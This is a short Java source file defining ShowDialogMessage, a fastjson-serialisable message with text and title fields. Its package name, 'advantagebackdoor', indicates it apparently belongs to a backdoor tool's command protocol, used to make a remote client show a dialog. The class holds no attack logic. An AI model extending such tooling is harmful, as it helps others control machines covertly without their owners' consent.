package me.faintcloudy.advantagebackdoor.api.message.play.server;

import com.alibaba.fastjson.annotation.JSONField;
import me.faintcloudy.advantagebackdoor.api.message.SimpleNetworkMessage;

public class ShowDialogMessage extends SimpleNetworkMessage {
    @JSONField
    public String text;
    @JSONField
    public String title;
    public ShowDialogMessage(String text, String title)
    {
        this.text = text;
        this.title = title;
    }

    public ShowDialogMessage() {}
}
